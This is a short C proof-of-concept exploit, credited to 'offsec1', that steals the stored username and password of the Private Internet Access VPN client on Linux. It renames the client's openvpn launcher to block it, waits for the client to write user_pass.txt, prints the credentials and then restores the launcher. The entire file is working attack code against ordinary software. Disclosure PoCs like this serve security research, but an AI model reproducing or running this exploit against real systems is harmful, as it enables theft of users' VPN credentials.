#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/file.h>

//quickest way to check if a file exists
bool fileExists(const char *name) {
	struct stat buffer;
	return (stat (name, &buffer) == 0);
}

int main() {

	const char* author = "offsec1";
	const char* openvpnOriginal = "/opt/pia/openvpn_launcher.64";
	const char* openvpnNew = "/opt/pia/openvpn_launcher.64_lock";
	const char* fileName = "/home/anonuser/.pia_manager/data/user_pass.txt";
	
	FILE* file;
	int c;

	printf("PoC - PrivateInternetAccess get username and password\n");
	printf("made by %s\n\n", author);

	if (rename(openvpnOriginal, openvpnNew) == -1) {
		printf("[-] cannot rename file... are you root?\n");
		return 0;
	}

	printf("[+] openvpn file was blocked\n");

	while (!fileExists(fileName)) {
	}
	
	printf("[+] found file\n\n");
	sleep(1);

	file = fopen(fileName, "r");

	while ( (c = fgetc(file)) != EOF)
		putchar(c);

	printf("\n[+] success\n");
	printf("cleanup...\n");
	fclose(file);
	rename(openvpnNew, openvpnOriginal);
	
}
